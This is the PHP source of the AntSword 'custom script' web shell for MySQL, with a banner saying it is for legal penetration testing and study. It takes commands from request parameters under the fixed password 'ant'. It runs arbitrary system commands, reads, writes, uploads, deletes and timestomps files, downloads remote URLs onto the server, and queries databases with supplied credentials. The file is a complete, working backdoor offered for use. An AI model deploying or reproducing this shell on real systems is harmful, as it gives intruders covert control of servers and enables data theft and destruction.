<?php
/**
*              _   ____                       _
*   __ _ _ __ | |_/ ___|_      _____  _ __ __| |
*  / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
* | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
*  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
* ———————————————————————————————————————————————
*     AntSword PHP Custom Script for Mysql
* 
*     警告：
*         此脚本仅供合法的渗透测试以及爱好者参考学习
*          请勿用于非法用途，否则将追究其相关责任！
* ———————————————————————————————————————————————
*
* 使用说明：
*  1. AntSword >= v2.0.7
*  2. 创建 Shell 时选择 custom 模式连接
*  3. 数据库连接：
*    <H>localhost</H>
*    <U>root</U>
*    <P>123456</P>
*
*  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
*
* ChangeLog:
*   Date: 2020/03/26 v1.4
*    1. 修复由于decode函数与EC函数位置写反而导致的乱码问题
*    2. 增加动态修改字符编码接口
*
*   Date: 2019/05/22 v1.3
*    1. 支持 mysqli 连接非默认端口
*
*   Date: 2019/04/05 v1.2
*    1. 新增 listcmd 接口
*    2. 新增数据库支持函数检查接口
*
*   Date: 2016/05/13 v1.1
*    1. 执行 DML 语句，显示执行状态
*
*   Date: 2016/04/06 v1.0
*    1. 文件系统 和 terminal 管理
*    2. mysql 数据库支持
*    3. 支持 base64 和 hex 编码
**/

$pwd = "ant"; //连接密码
//数据编码 3 选 1
$encoder = ""; // default
// $encoder = "base64"; //base64
// $encoder = "hex"; // hex
//$cs = "UTF-8";
$cs=isset($_REQUEST['charset'])?$_REQUEST['charset']:"UTF-8";

/**
* 字符编码处理
**/
function EC($s){
    global $cs;
    $sencode = mb_detect_encoding($s, array("ASCII","UTF-8","GB2312","GBK",'BIG5')); 
    $ret = "";
    try {
        $ret = mb_convert_encoding($s, $cs, $sencode);
    } catch (Exception $e) {
        try {
            $ret = iconv($sencode, $cs, $s);    
        } catch (Exception $e) {
            $ret = $s;
        }
    }
    return $ret;
}
/*传输解码*/
function decode($s){
    global $encoder;
    $ret = "";
    switch ($encoder) {
        case 'base64':
            $ret = base64_decode($s);
            break;
        case 'hex':
            for ($i=0; $i < strlen($s)-1; $i+=2) { 
                $output = substr($s, $i, 2);
                $decimal = intval($output, 16);
                $ret .= chr($decimal);
            }
            break;
        default:
            $ret = $s;
            break;
    }
    return $ret;
}
function showDatabases($encode, $conf){
    $sql = "show databases";
    $columnsep = "\t";
    $rowsep = "";
    return executeSQL($encode, $conf, $sql, $columnsep, $rowsep, false);
}
function showTables($encode, $conf, $dbname){
    $sql = "show tables from ".$dbname; // mysql
    $columnsep = "\t";
    $rowsep = "";
    return executeSQL($encode, $conf, $sql, $columnsep, $rowsep, false);
}

function showColumns($encode, $conf, $dbname, $table){
    $columnsep = "\t";
    $rowsep = "";
    $sql = "select * from ".$dbname.".".$table." limit 0,0"; // mysql
    return executeSQL($encode, $conf, $sql, $columnsep, $rowsep, true);
}

function query($encode, $conf, $sql){
    $columnsep = "\t|\t"; // general
    $rowsep = "\r\n";
    return executeSQL($encode, $conf, $sql, $columnsep, $rowsep, true);
}

function executeSQL($encode, $conf, $sql, $columnsep, $rowsep, $needcoluname){
    $ret = "";
    $m=get_magic_quotes_gpc();
    if ($m) {
        $conf = stripslashes($conf);
    }
    $conf = (EC($conf));

    /*
    <H>localhost</H>
    <U>root</U>
    <P>root</P>
    */
    $host="";
    $user="";
    $password="";
    if (preg_match('/<H>(.+?)<\/H>/i', $conf, $data)) {
        $host = $data[1];    
    }
    if (preg_match('/<U>(.+?)<\/U>/i', $conf, $data)) {
        $user = $data[1];    
    }
    if (preg_match('/<P>(.+?)<\/P>/i', $conf, $data)) {
        $password = $data[1];    
    }
    $encode = decode(EC($encode));
    $port=split(":",$host)[1];
    $host=split(":",$host)[0];
    $conn = @mysqli_connect($host, $user, $password, "", $port);
    $res = @mysqli_query($conn, $sql);
    if (is_bool($res)) {
        return "Status".$columnsep.$rowsep.($res?"True":"False").$columnsep.$rowsep;
    }
    $i=0;
    if ($needcoluname) {
        while ($col=@mysqli_fetch_field($res)) {
            $ret .= $col->name.$columnsep;
            $i++;
        }
        $ret .= $rowsep;
    }
    while($rs=@mysqli_fetch_row($res)){
        for($c = 0; $c <= $i; $c++){
            $ret .= trim($rs[$c]).$columnsep;
        }
        $ret.=$rowsep;
    }
    return $ret;
}

function BaseInfo(){
    $D=dirname($_SERVER["SCRIPT_FILENAME"]);
    if($D==""){
        $D=dirname($_SERVER["PATH_TRANSLATED"]);
    }
    $R="{$D}\t";
    if(substr($D,0,1)!="/"){
        foreach(range("C","Z")as $L)
            if(is_dir("{$L}:"))
                $R.="{$L}:";
    }else{
        $R.="/";
    }
    $R.="\t";
    $u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
    $s=($u)?$u["name"]:@get_current_user();
    $R.=php_uname();
    $R.="\t{$s}";
    return $R;
}
function FileTreeCode($D){
    $ret = "";
    $F=@opendir($D);
    if($F==NULL){
        $ret = "ERROR:// Path Not Found Or No Permission!";
    }else{
        $M=NULL;
        $L=NULL;
        while($N=@readdir($F)){
            $P=$D."/".$N;
            $T=@date("Y-m-d H:i:s",@filemtime($P));
            @$E=substr(base_convert(@fileperms($P),10,8),-4);
            $R="\t".$T."\t".@filesize($P)."\t".$E."\n";
            if(@is_dir($P))
                $M.=$N."/".$R;
            else
                $L.=$N.$R;
        }
        $ret .= $M.$L;
        @closedir($F);
    }
    return $ret;
}

function ReadFileCode($F){
    $ret = "";
    try {
        $P = @fopen($F,"r");
        $ret = (@fread($P,filesize($F)));
        @fclose($P);
    } catch (Exception $e) {
        $ret = "ERROR://".$e;
    }
    return $ret;
}
function WriteFileCode($path, $content){
    return @fwrite(fopen(($path),"w"),($content))?"1":"0";
}
function DeleteFileOrDirCode($fileOrDirPath){
    function df($p){
        $m=@dir($p);
        while(@$f=$m->read()){
            $pf=$p."/".$f;
            if((is_dir($pf))&&($f!=".")&&($f!="..")){
                @chmod($pf,0777);
                df($pf);
            }
            if(is_file($pf)){
                @chmod($pf,0777);
                @unlink($pf);
            }
        }
        $m->close();
        @chmod($p,0777);
        return @rmdir($p);
    }
    $F=(get_magic_quotes_gpc()?stripslashes($fileOrDirPath):$fileOrDirPath);
    if(is_dir($F)){
        return (df($F));
    }
    else{
        return (file_exists($F)?@unlink($F)?"1":"0":"0");
    }
}

function DownloadFileCode($filePath){
    $F=(get_magic_quotes_gpc()?stripslashes($filePath):$filePath);
    $fp=@fopen($F,"r");
    if(@fgetc($fp)){
        @fclose($fp);
        @readfile($F);
    }else{
        echo("ERROR:// Can Not Read");
    }
}
function UploadFileCode($path, $content){
    $f=$path;
    $c=$content;
    $c=str_replace("\r","",$c);
    $c=str_replace("\n","",$c);
    $buf="";
    for($i=0;$i<strlen($c);$i+=2)
        $buf.=urldecode("%".substr($c,$i,2));
    return (@fwrite(fopen($f,"a"),$buf)?"1":"0");
}
function CopyFileOrDirCode($path, $content){
    $m=get_magic_quotes_gpc();
    $fc=($m?stripslashes($path):$path);
    $fp=($m?stripslashes($content):$content);
    function xcopy($src,$dest){
        if(is_file($src)){
            if(!copy($src,$dest))
                return false;
            else
                return true;
        }
        $m=@dir($src);
        if(!is_dir($dest))
            if(!@mkdir($dest))
                return false;
        while($f=$m->read()){
            $isrc=$src.chr(47).$f;
            $idest=$dest.chr(47).$f;
            if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).chr(46))){
                if(!xcopy($isrc,$idest))return false;
            }else if(is_file($isrc)){
                if(!copy($isrc,$idest))
                    return false;
            }
        }
        return true;
    }
    return (xcopy($fc,$fp)?"1":"0");
}

function RenameFileOrDirCode($oldName, $newName){
    $m=get_magic_quotes_gpc();
    $src=(m?stripslashes($oldName):$oldName);
    $dst=(m?stripslashes($newName):$newName);
    return (rename($src,$dst)?"1":"0");
}
function CreateDirCode($name){
    $m=get_magic_quotes_gpc();
    $f=($m?stripslashes($name):$name);
    return (mkdir($f)?"1":"0");
}
function ModifyFileOrDirTimeCode($fileOrDirPath, $newTime){
    $m=get_magic_quotes_gpc();
    $FN=(m?stripslashes($fileOrDirPath):$fileOrDirPath);
    $TM=strtotime((m?stripslashes($newTime):$newTime));
    if(file_exists($FN)){
        return (@touch($FN,$TM,$TM)?"1":"0");
    }else{
        return ("0");
    }
}

function WgetCode($urlPath, $savePath){
    $fR=$urlPath;
    $fL=$savePath;
    $F=@fopen($fR,chr(114));
    $L=@fopen($fL,chr(119));
    if($F && $L){
        while(!feof($F))
            @fwrite($L,@fgetc($F));
        @fclose($F);
        @fclose($L);
        return "1";
    }else{
        return "0";
    }
}

function ExecuteCommandCode($cmdPath, $command){
    $p=$cmdPath;
    $s=$command;
    $d=dirname($_SERVER["SCRIPT_FILENAME"]);
    $c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
    $r="{$p} {$c}";
    @system($r." 2>&1",$ret);
    return ($ret!=0)?"ret={$ret}":"";
}

function probedb(){
    $ret="";
    $m=array(
        'mysql_close','mysqli_close','mssql_close','sqlsrv_close','ora_close','oci_close',
        'ifx_close','sqlite_close','pg_close','dba_close','dbmclose','filepro_fieldcount',
        'sybase_close'
    );
    foreach ($m as $f) {
        $ret.=($f."\t".(function_exists($f)?'1':'0')."\n");
    }
    if(function_exists('pdo_drivers')){
      foreach(@pdo_drivers() as $f){
        $ret.=("pdo_".$f."\t1\n");
      }
    }
    return $ret;
}

function listcmd($binarr){
    $ret="";
    $arr=@explode(",", $binarr);
    foreach($arr as $v){
        $ret.=($v."\t".(@file_exists($v)?"1":"0")."\n");
    }
    return $ret;
}

@ini_set("display_errors", "0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);

$funccode = EC($_REQUEST[$pwd]);
$z0 = EC(decode($_REQUEST['z0']));
$z1 = EC(decode($_REQUEST['z1']));
$z2 = EC(decode($_REQUEST['z2']));
$z3 = EC(decode($_REQUEST['z3']));

// echo "<meta HTTP-EQUIV=\"csontent-type\" content=\"text/html; charset={$cs}\">";
echo "->"."|";
$ret = "";
try {
    switch ($funccode) {
        case 'A':
            $ret = BaseInfo();
            break;
        case 'B':
            $ret = FileTreeCode($z1);
            break;
        case 'C':
            $ret = ReadFileCode($z1);
            break;
        case 'D':
            $ret = WriteFileCode($z1, $z2);
            break;
        case 'E':
            $ret = DeleteFileOrDirCode($z1);
            break;
        case 'F':
            DownloadFileCode($z1);
            break;
        case 'U':
            $ret = UploadFileCode($z1, $z2);
            break;
        case 'H':
            $ret = CopyFileOrDirCode($z1, $z2);
            break;
        case 'I':
            $ret = RenameFileOrDirCode($z1, $z2);
            break;
        case 'J':
            $ret = CreateDirCode($z1);
            break;
        case 'K':
            $ret = ModifyFileOrDirTimeCode($z1, $z2);
            break;
        case 'L':
            $ret = WgetCode($z1, $z2);
            break;
        case 'M':
            $ret = ExecuteCommandCode($z1, $z2);
            break;
        case 'N':
            $ret = showDatabases($z0, $z1);
            break;
        case 'O':
            $ret = showTables($z0, $z1, $z2);
            break;
        case 'P':
            $ret = showColumns($z0, $z1, $z2, $z3);
            break;
        case 'Q':
            $ret = query($z0, $z1, $z2);
            break;
        case 'Y':
            $ret = listcmd($z1);
            break;
        case 'Z':
            $ret = probedb();
            break;
        default:
            // $ret = "Wrong Password";
            break;
    }
} catch (Exception $e) {
    $ret = "ERROR://".$e;
}
echo $ret;
echo "|"."<-";
?>
